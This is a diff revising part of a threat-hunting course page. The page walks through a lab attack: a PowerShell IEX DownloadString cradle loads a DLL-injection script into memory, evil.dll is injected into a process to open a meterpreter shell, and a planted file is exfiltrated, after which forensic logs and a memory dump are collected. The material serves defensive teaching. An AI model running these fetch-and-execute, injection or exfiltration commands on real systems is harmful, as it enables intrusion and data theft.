@@ -756,7 +756,7 @@ And so, just so you are aware, we are going to download and inject into memory t
 The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to [refer to them](https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1) if you want. 
 
 **OK, so now let's go ahead and download + inject the script into memory:**
-1. On our Windows VM we'll open an administrative PowerShell terminal - a reminder that in order to do so you have to right-click on PowerShell and select `Run as Administrator`. 
+1. On our Windows VM we'll open an administrative PowerShell terminal.
 2. Now we'll run the following command, as mentioned before: it's going to download a script hosted on a web server (GitHub in this case) and then inject it directly into memory. 
 ```
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1')
@@ -783,11 +783,11 @@ If you really wanted to run the same thing you can [get it here](https://rufus.i
 
 1. Open `rufus.exe`, or whatever other non-MS application you chose. 
 
-2. But since we'll need to pass its Process ID (PID) to the script as an argument, we just need to find that real quick. You can either run Task Manager from the gui, or here I'll be running `ps` in PowerShell. And we can see here the PID is 784.
+2. We need to find the Process ID (PID) of `rufus.exe` since we'll pass that as an argument to our injection script. You can either run Task Manager from the gui, or here I'll be running `ps` in PowerShell. And we can see here the PID is 784.
 
 {{< figure src="/img/image048.png" title="" class="custom-figure" >}}
 
-4. And now all the pieces are in place so we can run the actual command below. We can note that we provide it two things, first the PID of the legit process we want to inject into, and the path to the DLL we want to be injected. So run the command in the same administrative PowerShell terminal. 
+3. And now all the pieces are in place so we can run our command. We can note that we provide it two things, first the PID of the legit process we want to inject into, and the path to the DLL we want to be injected. So run the command in the same administrative PowerShell terminal. 
 
 ```
 Invoke-DllInjection -ProcessID 784 -Dll C:\Users\User\Desktop\evil.dll
@@ -795,73 +795,72 @@ Invoke-DllInjection -ProcessID 784 -Dll C:\Users\User\Desktop\evil.dll
 
 {{< figure src="/img/image049.png" title="" class="custom-figure" >}}
 
-5. We see some output, now to know if it worked let's head on back to our Kali VM. We can immediately see that we received the connection and are now in a `meterpreter` shell - success!
+4. We see some output, now to know if it worked let's head on back to our Kali VM. We can immediately see that we received the connection and are now in a `meterpreter` shell - success!
 
 {{< figure src="/img/popped_shell.gif" title="" class="custom-figure" >}}
 
 {{< figure src="/img/image050.png" title="" class="custom-figure" >}}
 
-6. We can run a few commands if we'd like, also we'll exfiltrate the "nuclear launch codes" we created in the beginning. 
+5. We can run a few commands if we'd like, also we'll exfiltrate the "nuclear launch codes" we created in the beginning. 
 
 ```
-download C:\\Users\\user\\Desktop\\top_seekrit.txt /home/hacker/Desktop/
+download C:\\Users\\user\\Desktop\\tob_seekrit.txt /home/hacker/Desktop/
 ```
 {{< figure src="/img/image051.png" title="" class="custom-figure" >}}
 
 Additionally, we can also drop into a `shell`.
 
-{{< figure src="/img/image052.png" title="" class="custom-figure" >}}
+{{< figure src="/img/image052.png" title="" class="custom-figure-3" >}}
 
 That's it for our attack!
 
-# Artifact Collection
+# 2.3.6. Artifact Consolidation
 
-One final thing before we move one: lets concretize all our forensic artifacts.
+Since our attack is finish, let's package our logs, traffic capture, and memory dump.
 
-First we'll export our Sysmon log, run the following command in an administrative PowerShell terminal:
+**Export Sysmon Log:**
+Run the following command in an administrative PowerShell terminal:
 ```
 wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Users\User\Desktop\SysmonLog.evtx”
 ```
-
-Stay in the same administrative PowerShell terminal so we can also export our PowerShell ScriptBlock logs:
+**Export PowerShell Log:**
+In the same administrative PowerShell terminal export the PowerShell ScriptBlock logs:
 ```
 wevtutil epl "Microsoft-Windows-PowerShell/Operational" "C:\Users\User\Desktop\PowerShellScriptBlockLog.evtx" "/q:*[System[(EventID=4104)]]"
 ```
-
+**Export Traffic Capture:**
 Now let's stop our packet capture: 
 1. Open WireShark.
 2. Press the red STOP button.
 3. Save the file, in my case I will save it to desktop as `dllattack.pcap`.
 
+**Export Sysmon Log:**
 And finally we'll dump the memory for our post-mortem analysis:
 1. Open a `Command Prompt` as administrator. 
 2. Navigate to the directory where you saved `winpmem`, in my case it's on the desktop.
-3. We'll run the following command, meaning it will dump the memory and save it as `memdump.raw` in our present directory
+3. We'll run the following command, meaning it will dump the memory and save it as `memdump.raw` in our present directory (desktop):
 
 ```
 winpmem.exe memdump.raw
 ```
 
-Awesome. We're ready to move on to our analysis, however I wanna take a kinda "detour" chapter next to grant us a bit of perspective. If it sounds a bit befuddling now, please venture forth - soon it will make sense. 
-
-{{< figure src="/img/confused_dude.gif" title="" class="custom-figure" >}}
-
 ***
 
 # Shenanigans! A (honest) review of our attack
 
-OK so let's just hold back for a second. At this point, if you have your wits about you, you might, and rightfully so I'll add, be calling **shenanigans** on me. 
+OK so let's just hold zoom out and discuss the attack we just performed. At this point, if you have your wits about you, you might, and rightfully so I'll add, be calling **shenanigans** on me. 
 
-{{< figure src="/img/shenanigans.gif" title="" class="custom-figure" >}}
+{{< figure src="/img/shenanigans.gif" title="" class="custom-figure-3" >}}
 
-"Wait", I hear you say, "if the whole point of infecting the victim and getting C2 control established is so that we can run commands on it, isn't it cheating then to be running these commands ahead of that actually happening"? Look at the meta: the whole point of establishing C2 on the victim is so we can run commands on it, but we literally just allowed ourselves to freely run commands on the victim so that we can establish C2. We wrote our malicious DLL to disk, injected our DLL-injection script into memory, and ran the script all from the comfort of Imaginationaland.
+"Wait", I hear you say, "if the whole point of infecting the victim and getting C2 control established is so that we can run commands on it, isn't it cheating then to be running these commands ahead of that actually happening"? 
 
-{{< figure src="/img/imagination.gif" title="" class="custom-figure" >}}
+Look at the meta: the whole point of establishing C2 on the victim is so we can run commands on it, but we literally just allowed ourselves to freely run commands on the victim so that we can establish C2. We wrote our malicious DLL to disk, injected our DLL-injection script into memory, and ran the script all from the comfort of Imaginationland.
 
-So then the answer is yes. That was cheating - of course. But, it's cheating with a purpose you see, the purpose here being that this is a course on threat hunting and not on initial compromise. So we stripped the actions of the initial compromise down to its core and for now we've foregone our spearfishing email and VBA macro. We've streamlined the essence of the attack - we're expending less energy in the effort, and yet for our intents have created the same outcome. If you wanted a more realistic approximation of the initial compromise + other elements of Red Teaming - [here's a good free resource to get you going](https://www.youtube.com/watch?v=EIHLXWnK1Dw&list=PLBf0hzazHTGMjSlPmJ73Cydh9vCqxukCu)
- 
+{{< figure src="/img/imagination.gif" title="" class="custom-figure-3" >}}
 
-So, we won't be investing our time in completely recreating a realistic simulation of the intial compromise, HOWEVER, I do think it's very important for us to discuss here what it would look like. We are about to embark on a Threat Hunt, which is an investigation; but there would be no value for us to go attempting to discover things that exists only because of our specific "cheating" method here. Meaning: I want to make sure you understand which parts of the attack we just performed are representative of an actual acttack, and which are not. The reason for this of course is so we can focus on what really matters - ie that which we expect to see following a real-life attack. 
+So then the answer is *yes*. That was cheating - of course. But, it's cheating with a purpose you see, the purpose here being that this is a course on threat hunting. So we stripped the actions of the initial compromise down to its core and for now we've foregone our spearfishing email and VBA macro. We've streamlined the essence of the attack - we're expending less energy in the effort, and yet for our intents have created the same outcome. 
+
+So, we won't be investing our time in completely recreating a realistic simulation of the intial compromise, *however*, I do think it's very important for us to discuss here what that would look like. We are about to embark on our threat hunt, which is an investigation; but there would be no value for us to go attempting to discover things that exists only because of our specific "cheating" method here. Meaning: I want to make sure you understand which parts of the attack we just performed are representative of an actual attack, and which are not. The reason for this of course is so we can focus on what really matters - ie that which we expect to see following a real-life attack. 
 
 So the remainder of this section will be dedicated to that. I'm very briefly going to review all the main beats to the attack we just performed, thereafter I'll "translate" the actions to their real-world counterpart, pointing out specifically which elements we expect to see in an actual attack, and which we don't. 
 
